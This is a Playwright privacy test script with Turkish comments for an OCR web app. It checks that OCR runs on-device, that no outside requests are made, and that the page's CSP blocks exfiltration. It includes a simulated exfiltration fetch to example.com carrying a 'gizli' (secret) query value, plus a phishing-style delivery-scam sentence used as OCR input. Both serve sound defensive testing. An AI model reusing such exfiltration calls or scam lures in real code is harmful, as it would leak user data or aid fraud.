// Gizlilik uçtan uca testi: "veri cihazdan çıkmaz" vaadini gerçek tarayıcıda doğrular.
//
// 1. GitHub Pages çıktısını (out/) yerel bir sunucuda /kalkan altında sunar.
// 2. Türkçe metinli bir ekran görüntüsü üretir, OCR ile okutur ve metnin doğru okunduğunu kontrol eder.
// 3. Sayfanın tarayıcı dışındaki hiçbir sunucuya istek atmadığını kontrol eder (CDN dahil).
// 4. Sayfa içinden dış sunucuya veri gönderme denemesinin CSP tarafından engellendiğini kontrol eder.
//
// Kullanım: node scripts/privacy-check.mjs [out klasörü]
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import { chromium } from 'playwright';

const outDir = path.resolve(process.argv[2] ?? 'out');
const BASE = '/kalkan';
const MIME = {
  '.html': 'text/html; charset=utf-8', '.js': 'text/javascript', '.css': 'text/css', '.json': 'application/json',
  '.wasm': 'application/wasm', '.png': 'image/png', '.jpg': 'image/jpeg', '.svg': 'image/svg+xml', '.txt': 'text/plain',
};

const server = http.createServer((req, res) => {
  let urlPath = decodeURIComponent(new URL(req.url, 'http://localhost').pathname);
  if (!urlPath.startsWith(BASE)) return res.writeHead(404).end();
  urlPath = urlPath.slice(BASE.length) || '/';
  let file = path.join(outDir, urlPath);
  if (fs.existsSync(file) && fs.statSync(file).isDirectory()) file = path.join(file, 'index.html');
  if (!fs.existsSync(file) && fs.existsSync(`${file}.html`)) file = `${file}.html`;
  if (!file.startsWith(outDir) || !fs.existsSync(file)) return res.writeHead(404).end();
  res.writeHead(200, { 'Content-Type': MIME[path.extname(file)] ?? 'application/octet-stream' });
  fs.createReadStream(file).pipe(res);
});
await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
const origin = `http://127.0.0.1:${server.address().port}`;

const failures = [];
const browser = await chromium.launch();
try {
  const page = await browser.newPage();

  const imagePath = path.join(os.tmpdir(), 'kalkan-ocr-test.png');
  await page.setContent(
    '<div style="font:48px Arial;padding:40px;background:#fff;color:#000;width:1100px">' +
      'Sayın müşterimiz, kargonuz teslim edilemedi.<br>Adresinizi güncellemek için tıklayın: bit.ly/kargo-tr</div>',
  );
  await page.locator('div').screenshot({ path: imagePath });

  const externalRequests = [];
  page.on('request', (request) => {
    const url = request.url();
    if (!url.startsWith(origin) && !url.startsWith('blob:') && !url.startsWith('data:')) externalRequests.push(url);
  });

  await page.goto(`${origin}${BASE}/`, { waitUntil: 'networkidle' });
  await page.locator('input[type=file]').setInputFiles(imagePath);

  let status = '';
  for (let second = 0; second < 90 && !status; second += 1) {
    const body = await page.locator('body').innerText();
    status = body.match(/Metin cihazında okundu|Görsel okunamadı|Görselde okunabilir metin bulunamadı/)?.[0] ?? '';
    if (!status) await page.waitForTimeout(1000);
  }
  const text = (await page.locator('textarea').first().inputValue()).replace(/\s+/g, ' ');

  if (status !== 'Metin cihazında okundu') failures.push(`OCR tamamlanmadı (durum: ${status || 'zaman aşımı'})`);
  if (!/kargonuz teslim edilemedi/i.test(text)) failures.push(`OCR metni beklenenden farklı: "${text.slice(0, 80)}"`);
  if (externalRequests.length) failures.push(`Dış sunuculara istek atıldı: ${[...new Set(externalRequests)].join(', ')}`);

  const exfiltration = await page.evaluate(async () => {
    try {
      await fetch('https://example.com/?veri=gizli', { mode: 'no-cors' });
      return 'gönderildi';
    } catch {
      return 'engellendi';
    }
  });
  if (exfiltration !== 'engellendi') failures.push('CSP dış sunucuya veri gönderimini engellemedi');

  console.log(`OCR: ${status || 'zaman aşımı'} | metin: "${text.slice(0, 60)}…"`);
  console.log(`Dış istek: ${externalRequests.length} | dışarı veri gönderme denemesi: ${exfiltration}`);
} finally {
  await browser.close();
  server.close();
}

if (failures.length) {
  console.error(`\nGizlilik testi BAŞARISIZ:\n- ${failures.join('\n- ')}`);
  process.exit(1);
}
console.log('\nGizlilik testi geçti: OCR cihazda çalışıyor, sayfa dış sunuculara istek atmıyor, CSP veri sızdırmayı engelliyor.');
